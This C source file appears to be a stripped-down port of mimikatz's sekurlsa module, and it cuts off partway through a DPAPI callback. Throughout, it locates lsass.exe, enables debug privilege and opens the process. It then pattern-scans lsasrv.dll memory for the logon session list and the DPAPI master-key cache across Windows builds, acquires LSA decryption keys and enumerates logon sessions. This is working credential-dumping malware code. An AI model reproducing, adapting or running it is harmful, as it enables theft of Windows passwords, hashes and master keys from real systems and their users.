#include "lsass_dump.h"

const KUHL_M_SEKURLSA_LOCAL_HELPER* lsassLocalHelper = NULL;
KUHL_M_SEKURLSA_CONTEXT cLsass = { NULL, {0, 0, 0} };
PKIWI_MASTERKEY_CACHE_ENTRY pMasterKeyCacheList = NULL;

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_lsa_package = { L"dpapi", NULL, FALSE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_svc_package = { L"dpapi", NULL, FALSE, L"dpapisrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = { L"msv", NULL, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_wdigest_package = { L"wdigest", NULL, TRUE, L"wdigest.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_tspkg_package = { L"tspkg", NULL, TRUE, L"tspkg.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = { L"kerberos", NULL, TRUE, L"kerberos.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_ssp_package = { L"ssp", NULL, TRUE, L"msv1_0.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_package = { L"credman", NULL, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_cloudap_package = { L"cloudap", NULL, FALSE, L"cloudap.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
#if !defined(_M_ARM64)
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_livessp_package = { L"livessp", NULL, FALSE, L"livessp.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
#endif

 KULL_M_MEMORY_HANDLE KULL_M_MEMORY_GLOBAL_OWN_HANDLE = { KULL_M_MEMORY_TYPE_OWN, NULL };

PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD BuildNumber)
{
	SIZE_T i;
	PKULL_M_PATCH_GENERIC current = NULL;

	for (i = 0; i < cbGenerics; i++)
	{
		if (generics[i].MinBuildNumber <= BuildNumber)
			current = &generics[i];
		else break;
	}
	return current;
}


BOOL memory_open(IN KULL_M_MEMORY_TYPE Type, IN HANDLE hAny, OUT PKULL_M_MEMORY_HANDLE* hMemory)
{
	BOOL status = FALSE;

	*hMemory = (PKULL_M_MEMORY_HANDLE)LocalAlloc(LPTR, sizeof(KULL_M_MEMORY_HANDLE));
	if (*hMemory)
	{
		(*hMemory)->type = Type;
		switch (Type)
		{
		case KULL_M_MEMORY_TYPE_OWN:
			status = TRUE;
			break;
		case KULL_M_MEMORY_TYPE_PROCESS:
			if ((*hMemory)->pHandleProcess = (PKULL_M_MEMORY_HANDLE_PROCESS)LocalAlloc(LPTR, sizeof(KULL_M_MEMORY_HANDLE_PROCESS)))
			{
				(*hMemory)->pHandleProcess->hProcess = hAny;
				status = TRUE;
			}
			break;
		case KULL_M_MEMORY_TYPE_KERNEL:
			if ((*hMemory)->pHandleDriver = (PKULL_M_MEMORY_HANDLE_KERNEL)LocalAlloc(LPTR, sizeof(KULL_M_MEMORY_HANDLE_KERNEL)))
			{
				(*hMemory)->pHandleDriver->hDriver = hAny;
				status = TRUE;
			}
			break;
		default:
			break;
		}
		if (!status)
			LocalFree(*hMemory);
	}
	return status;
}

PKULL_M_MEMORY_HANDLE memory_close(IN PKULL_M_MEMORY_HANDLE hMemory)
{
	if (hMemory)
	{
		switch (hMemory->type)
		{
		case KULL_M_MEMORY_TYPE_PROCESS:
			LocalFree(hMemory->pHandleProcess);
			break;
		case KULL_M_MEMORY_TYPE_KERNEL:
			LocalFree(hMemory->pHandleDriver);
			break;
		default:
			break;
		}
		return (PKULL_M_MEMORY_HANDLE)LocalFree(hMemory);
	}
	else return NULL;
}

BOOL kull_m_memory_copy(OUT PKULL_M_MEMORY_ADDRESS Destination, IN PKULL_M_MEMORY_ADDRESS Source, IN SIZE_T Length)
{
	BOOL status = FALSE;
	BOOL bufferMeFirst = FALSE;
	KULL_M_MEMORY_ADDRESS aBuffer = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
	DWORD nbReadWrite;

	switch (Destination->hMemory->type)
	{
	case KULL_M_MEMORY_TYPE_OWN:
		switch (Source->hMemory->type)
		{
		case KULL_M_MEMORY_TYPE_OWN:
			RtlCopyMemory(Destination->address, Source->address, Length);
			status = TRUE;
			break;
		case KULL_M_MEMORY_TYPE_PROCESS:
			status = ReadProcessMemory(Source->hMemory->pHandleProcess->hProcess, Source->address, Destination->address, Length, NULL);
			break;
		case KULL_M_MEMORY_TYPE_FILE:
			if (SetFilePointer(Source->hMemory->pHandleFile->hFile, PtrToLong(Source->address), NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER)
				status = ReadFile(Source->hMemory->pHandleFile->hFile, Destination->address, (DWORD)Length, &nbReadWrite, NULL);
			break;
		default:
			break;
		}
		break;
	case KULL_M_MEMORY_TYPE_PROCESS:
		switch (Source->hMemory->type)
		{
		case KULL_M_MEMORY_TYPE_OWN:
			status = WriteProcessMemory(Destination->hMemory->pHandleProcess->hProcess, Destination->address, Source->address, Length, NULL);
			break;
		default:
			bufferMeFirst = TRUE;
			break;
		}
		break;
	default:
		break;
	}

	if (bufferMeFirst)
	{
		if (aBuffer.address = LocalAlloc(LPTR, Length))
		{
			if (kull_m_memory_copy(&aBuffer, Source, Length))
				status = kull_m_memory_copy(Destination, &aBuffer, Length);
			LocalFree(aBuffer.address);
		}
	}
	return status;
}

BOOL kull_m_memory_search(IN PKULL_M_MEMORY_ADDRESS Pattern, IN SIZE_T Length, IN PKULL_M_MEMORY_SEARCH Search, IN BOOL bufferMeFirst)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_SEARCH  sBuffer = { {{NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, Search->kull_m_memoryRange.size}, NULL };
	PBYTE CurrentPtr;
	PBYTE limite = (PBYTE)Search->kull_m_memoryRange.kull_m_memoryAdress.address + Search->kull_m_memoryRange.size;

	switch (Pattern->hMemory->type)
	{
	case KULL_M_MEMORY_TYPE_OWN:
		switch (Search->kull_m_memoryRange.kull_m_memoryAdress.hMemory->type)
		{
		case KULL_M_MEMORY_TYPE_OWN:
			for (CurrentPtr = (PBYTE)Search->kull_m_memoryRange.kull_m_memoryAdress.address; !status && (CurrentPtr + Length <= limite); CurrentPtr++)
				status = RtlEqualMemory(Pattern->address, CurrentPtr, Length);
			CurrentPtr--;
			break;
		case KULL_M_MEMORY_TYPE_PROCESS:
		case KULL_M_MEMORY_TYPE_FILE:
		case KULL_M_MEMORY_TYPE_KERNEL:
			if (sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address = LocalAlloc(LPTR, Search->kull_m_memoryRange.size))
			{
				if (kull_m_memory_copy(&sBuffer.kull_m_memoryRange.kull_m_memoryAdress, &Search->kull_m_memoryRange.kull_m_memoryAdress, Search->kull_m_memoryRange.size))
					if (status = kull_m_memory_search(Pattern, Length, &sBuffer, FALSE))
						CurrentPtr = (PBYTE)Search->kull_m_memoryRange.kull_m_memoryAdress.address + (((PBYTE)sBuffer.result) - (PBYTE)sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address);
				LocalFree(sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address);
			}
			break;
		default:
			break;
		}
		break;
	default:
		break;
	}

	Search->result = status ? CurrentPtr : NULL;

	return status;
}

//sekurla_utils
#if defined(_M_X64)
BYTE PTRN_WN61_LogonSessionList[] = { 0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84 };
BYTE PTRN_WN6x_LogonSessionList[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
BYTE PTRN_WN1703_LogonSessionList[] = { 0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
BYTE PTRN_WN1803_LogonSessionList[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
BYTE PTRN_WN11_LogonSessionList[] = { 0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}},
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
	{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
	{KULL_M_WIN_BUILD_2022,		{sizeof(PTRN_WN11_LogonSessionList),	PTRN_WN11_LogonSessionList},	{0, NULL}, {24,  -4}},
};
#endif

PLIST_ENTRY LogonSessionList = NULL;
PULONG LogonSessionListCount = NULL;

BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID* genericPtr, PVOID* genericPtr1, PVOID* genericPtr2, PLONG genericOffset1)
{
	KULL_M_MEMORY_ADDRESS aLsassMemory = { NULL, cLsass->hLsassMem }, aLocalMemory = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
	KULL_M_MEMORY_SEARCH sMemory = { {{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL };
	PKULL_M_PATCH_GENERIC currentReference;
#if defined(_M_X64)
	LONG offset;
#endif

	if (currentReference = kull_m_patch_getGenericFromBuild(generics, cbGenerics, cLsass->osContext.BuildNumber))
	{
		aLocalMemory.address = currentReference->Search.Pattern;
		if (kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
		{
			aLsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off0; // optimize one day
			if (genericOffset1)
				*genericOffset1 = currentReference->Offsets.off1;
		#if defined(_M_X64)
			aLocalMemory.address = &offset;
			if (pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
				*genericPtr = ((PBYTE)aLsassMemory.address + sizeof(LONG) + offset);
		#elif defined(_M_IX86)
			aLocalMemory.address = genericPtr;
			pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
		#endif

			if (genericPtr1)
			{
				aLsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off1;
			#if defined(_M_X64)
				aLocalMemory.address = &offset;
				if (pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
					*genericPtr1 = ((PBYTE)aLsassMemory.address + sizeof(LONG) + offset);
			#elif defined(_M_IX86)
				aLocalMemory.address = genericPtr1;
				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
			#endif
			}

			if (genericPtr2)
			{
				aLsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off2;
			#if defined(_M_X64)
				aLocalMemory.address = &offset;
				if (pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
					*genericPtr2 = ((PBYTE)aLsassMemory.address + sizeof(LONG) + offset);
			#elif defined(_M_IX86)
				aLocalMemory.address = genericPtr2;
				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
			#endif
			}
		}
	}
	return pLib->isInit;
}

BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
{
	PVOID* pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID*)&LogonSessionListCount);
	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences, ARRAYSIZE(LsaSrvReferences), (PVOID*)&LogonSessionList, pLogonSessionListCount, NULL, NULL);
}



BOOL kull_m_process_peb(PKULL_M_MEMORY_HANDLE memory, PPEB pPeb, BOOL isWOW)
{
	BOOL status = FALSE;
	PROCESS_BASIC_INFORMATION processInformations;
	HANDLE hProcess = (memory->type == KULL_M_MEMORY_TYPE_PROCESS) ? memory->pHandleProcess->hProcess : GetCurrentProcess();
	KULL_M_MEMORY_ADDRESS aBuffer = { pPeb, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
	KULL_M_MEMORY_ADDRESS aProcess = { NULL, memory };
	PROCESSINFOCLASS info;
	ULONG szPeb, szBuffer, szInfos;
	LPVOID buffer;

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
		info = ProcessBasicInformation;
		szBuffer = sizeof(processInformations);
		buffer = &processInformations;
		szPeb = sizeof(PEB);
#endif

	switch (memory->type)
	{
	case KULL_M_MEMORY_TYPE_PROCESS:
		if (NT_SUCCESS(NtQueryInformationProcess(hProcess, info, buffer, szBuffer, &szInfos)) && (szInfos == szBuffer) && processInformations.PebBaseAddress)
		{
			aProcess.address = processInformations.PebBaseAddress;
			status = kull_m_memory_copy(&aBuffer, &aProcess, szPeb);
		}
		break;
	}
	return status;
}

//process
NTSTATUS kull_m_process_NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS informationClass, PVOID buffer, ULONG informationLength)
{
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	DWORD sizeOfBuffer, returnedLen;

	if (*(PVOID*)buffer)
	{
		status = NtQuerySystemInformation(informationClass, *(PVOID*)buffer, informationLength, &returnedLen);
	}
	else
	{
		for (sizeOfBuffer = 0x1000; (status == STATUS_INFO_LENGTH_MISMATCH) && (*(PVOID*)buffer = LocalAlloc(LPTR, sizeOfBuffer)); sizeOfBuffer <<= 1)
		{
			status = NtQuerySystemInformation(informationClass, *(PVOID*)buffer, sizeOfBuffer, &returnedLen);
			if (!NT_SUCCESS(status))
				LocalFree(*(PVOID*)buffer);
		}
	}
	return status;
}

NTSTATUS kull_m_process_getProcessInformation(PKULL_M_PROCESS_ENUM_CALLBACK callBack, PVOID pvArg)
{
	NTSTATUS status;
	PSYSTEM_PROCESS_INFORMATION buffer = NULL, myInfos;

	status = kull_m_process_NtQuerySystemInformation(SystemProcessInformation, &buffer, 0);

	if (NT_SUCCESS(status))
	{
		for (myInfos = buffer; callBack(myInfos, pvArg) && myInfos->NextEntryOffset; myInfos = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)myInfos + myInfos->NextEntryOffset));
		LocalFree(buffer);
	}
	return status;
}

BOOL CALLBACK kull_m_process_callback_pidForName(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
{
	if (((PKULL_M_PROCESS_PID_FOR_NAME)pvArg)->isFound = RtlEqualUnicodeString(&pSystemProcessInformation->ImageName, ((PKULL_M_PROCESS_PID_FOR_NAME)pvArg)->name, TRUE)) {
		*((PKULL_M_PROCESS_PID_FOR_NAME)pvArg)->processId = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
	}
		
	return !((PKULL_M_PROCESS_PID_FOR_NAME)pvArg)->isFound;
}

BOOL process_getProcessIdForName(LPCWSTR name, PDWORD processId)
{
	BOOL status = FALSE;
	UNICODE_STRING uName;
	KULL_M_PROCESS_PID_FOR_NAME mySearch = { &uName, processId, FALSE };

	RtlInitUnicodeString(&uName, name);
	if (NT_SUCCESS(kull_m_process_getProcessInformation(kull_m_process_callback_pidForName, &mySearch)))
		status = mySearch.isFound;
	return status;
}

NTSTATUS kull_m_process_getVeryBasicModuleInformations(PKULL_M_MEMORY_HANDLE memory, PKULL_M_MODULE_ENUM_CALLBACK callBack, PVOID pvArg)
{
	NTSTATUS status = STATUS_DLL_NOT_FOUND;
	PEB Peb; PEB_LDR_DATA LdrData; LDR_DATA_TABLE_ENTRY LdrEntry;
	KULL_M_MEMORY_ADDRESS aBuffer = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
	KULL_M_MEMORY_ADDRESS aProcess = { NULL, memory };
	PBYTE aLire, fin;
	UNICODE_STRING moduleName;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION moduleInformation;
	BOOL continueCallback = TRUE;
	moduleInformation.DllBase.hMemory = memory;
	
	switch (memory->type) {
	case KULL_M_MEMORY_TYPE_PROCESS:
		moduleInformation.NameDontUseOutsideCallback = &moduleName;
		if (kull_m_process_peb(memory, &Peb, FALSE))
		{
			aBuffer.address = &LdrData; aProcess.address = Peb.Ldr;
			if (kull_m_memory_copy(&aBuffer, &aProcess, sizeof(LdrData)))
			{
				for (
					aLire = (PBYTE)(LdrData.InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks),
					fin = (PBYTE)(Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector);
					(aLire != fin) && continueCallback;
					aLire = (PBYTE)LdrEntry.InMemoryOrderLinks.Flink - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
					)
				{
					aBuffer.address = &LdrEntry; aProcess.address = aLire;
					if (continueCallback = kull_m_memory_copy(&aBuffer, &aProcess, sizeof(LdrEntry)))
					{
						moduleInformation.DllBase.address = LdrEntry.DllBase;
						moduleInformation.SizeOfImage = LdrEntry.SizeOfImage;
						moduleName = LdrEntry.BaseDllName;
						if (moduleName.Buffer = (PWSTR)LocalAlloc(LPTR, moduleName.MaximumLength))
						{
							aBuffer.address = moduleName.Buffer; aProcess.address = LdrEntry.BaseDllName.Buffer;
							if (kull_m_memory_copy(&aBuffer, &aProcess, moduleName.MaximumLength))
							{
								//kull_m_process_adjustTimeDateStamp(&moduleInformation);
								continueCallback = callBack(&moduleInformation, pvArg);
							}
							LocalFree(moduleName.Buffer);
						}
					}
				}
				status = STATUS_SUCCESS;
			}
		}
		break;
	default:
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}

	return status;
}

//sekurlsa_enum
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kdcsvc_package = { L"kdc", NULL, FALSE, L"kdcsvc.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE} };
const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
	&kuhl_m_sekurlsa_msv_package,
	&kuhl_m_sekurlsa_tspkg_package,
	&kuhl_m_sekurlsa_wdigest_package,
#if !defined(_M_ARM64)
	&kuhl_m_sekurlsa_livessp_package,
#endif
	& kuhl_m_sekurlsa_kerberos_package,
	&kuhl_m_sekurlsa_ssp_package,
	&kuhl_m_sekurlsa_dpapi_svc_package,
	&kuhl_m_sekurlsa_credman_package,
	&kuhl_m_sekurlsa_kdcsvc_package,
	&kuhl_m_sekurlsa_cloudap_package,
};

BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	ULONG i;
	for (i = 0; i < ARRAYSIZE(lsassPackages); i++)
	{
		if (_wcsicmp(lsassPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
		{
			lsassPackages[i]->Module.isPresent = TRUE;
			lsassPackages[i]->Module.Informations = *pModuleInformation;
		}
	}
	return TRUE;
}

const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
};

const KUHL_M_SEKURLSA_LOCAL_HELPER lsassLocalHelpers[] = {
	{kuhl_m_sekurlsa_nt6_init,	kuhl_m_sekurlsa_nt6_clean,	kuhl_m_sekurlsa_nt6_acquireKeys,	&kuhl_m_sekurlsa_nt6_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt6_pLsaUnprotectMemory},
};


NTSTATUS acquireLSA() {
	NTSTATUS status = STATUS_SUCCESS;
	KULL_M_MEMORY_TYPE Type;
	HANDLE hData = NULL;
	DWORD pid;
	DWORD processRights =  PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
	BOOL isError = FALSE;

	if (!cLsass.hLsassMem) {
		status = STATUS_NOT_FOUND;
		Type = KULL_M_MEMORY_TYPE_PROCESS;
		if (process_getProcessIdForName(L"lsass.exe", &pid)) {
			ULONG previousState;

			RtlAdjustPrivilege(20, TRUE, FALSE, &previousState);
			hData = OpenProcess(processRights, FALSE, pid);
		}
		
		if (hData && hData != INVALID_HANDLE_VALUE) {
			if (memory_open(Type, hData, &cLsass.hLsassMem)) {
				cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
				cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
				cLsass.osContext.BuildNumber = MIMIKATZ_NT_BUILD_NUMBER;

				if (!isError) {
					lsassLocalHelper = &lsassLocalHelpers[0];
					if (NT_SUCCESS(lsassLocalHelper->initLocalLib())) {						
						if (NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent) {
							if (kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
							{
								status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);

							}
						}
					}
				}
			}

			if (!NT_SUCCESS(status)) {
				CloseHandle(hData);
			}
		}

		if (!NT_SUCCESS(status)) {
			cLsass.hLsassMem = memory_close(cLsass.hLsassMem);
		}
	}

	return status;
}

NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData) {
	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
	ULONG nbListes = 1, i;
	PVOID pStruct;
	KULL_M_MEMORY_ADDRESS securityStruct, data = { &nbListes, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE }, aBuffer = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
	BOOL retCallback = TRUE;
	const KUHL_M_SEKURLSA_ENUM_HELPER* helper;

	RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00007fff;
	NTSTATUS status = acquireLSA();

	if (NT_SUCCESS(status)) {
		sessionData.cLsass = &cLsass;
		sessionData.lsassLocalHelper = lsassLocalHelper;

		if (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_8)
			helper = &lsassEnumHelpers[0];
		else
			helper = &lsassEnumHelpers[1];

		securityStruct.hMemory = cLsass.hLsassMem;
		if (securityStruct.address = LogonSessionListCount) {
			kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));
		}
		
		for (i = 0; i < nbListes; i++)
		{
			securityStruct.address = &LogonSessionList[i];
			data.address = &pStruct;
			data.hMemory = &KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
			if (aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
			{
				if (kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))
				{
					data.address = pStruct;
					data.hMemory = securityStruct.hMemory;

					while ((data.address != securityStruct.address) && retCallback)
					{
						if (kull_m_memory_copy(&aBuffer, &data, helper->tailleStruct))
						{
							sessionData.LogonId = (PLUID)((PBYTE)aBuffer.address + helper->offsetToLuid);
							sessionData.LogonType = *((PULONG)((PBYTE)aBuffer.address + helper->offsetToLogonType));

							retCallback = callback(&sessionData, pOptionalData);
							data.address = ((PLIST_ENTRY)(aBuffer.address))->Flink;
						}
						else break;
					}
				}
				LocalFree(aBuffer.address);
			}
		}
	}

	return status;
}

//sekurlsa_dpapi -> lsass dpapi_masterkeys dump
#if defined(_M_X64)
BYTE PTRN_WI61_MasterKeyCacheList[] = { 0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05 }; // InitializeKeyCache to avoid  version change
BYTE PTRN_WI62_MasterKeyCacheList[] = { 0x4c, 0x89, 0x1f, 0x48, 0x89, 0x47, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85 };
BYTE PTRN_WI64_MasterKeyCacheList[] = { 0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08 };
BYTE PTRN_WI64_1607_MasterKeyCacheList[] = { 0x48, 0x89, 0x4f, 0x08, 0x48, 0x89, 0x78, 0x08 };

KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI61_MasterKeyCacheList),	PTRN_WI61_MasterKeyCacheList},	{0, NULL}, { 7}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI62_MasterKeyCacheList),	PTRN_WI62_MasterKeyCacheList},	{0, NULL}, {-4}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI64_MasterKeyCacheList),	PTRN_WI64_MasterKeyCacheList},	{0, NULL}, {-7}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WI64_1607_MasterKeyCacheList),	PTRN_WI64_1607_MasterKeyCacheList},	{0, NULL}, {11}},
};
#elif defined(_M_IX86)
BYTE PTRN_WALL_MasterKeyCacheList[] = { 0x33, 0xc0, 0x40, 0xa3 };
BYTE PTRN_WI60_MasterKeyCacheList[] = { 0x8b, 0xf0, 0x81, 0xfe, 0xcc, 0x06, 0x00, 0x00, 0x0f, 0x84 };
KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_MasterKeyCacheList),	PTRN_WALL_MasterKeyCacheList},	{0, NULL}, {-4}},
	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList},	{0, NULL}, {-16}},// ?
};
#endif

void kull_m_string_displayGUID(IN LPCGUID pGuid)
{
	UNICODE_STRING uString;
	if (NT_SUCCESS(RtlStringFromGUID(pGuid, &uString)))
	{
		wprintf(L"%wZ", &uString);
		myRtlFreeUnicodeString(&uString);
	}
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData) {
	KIWI_MASTERKEY_CACHE_ENTRY mesCredentials;
	KULL_M_MEMORY_ADDRESS aBuffer = { &mesCredentials, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE }, aKey = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE }, aLsass = { NULL, pData->cLsass->hLsassMem };
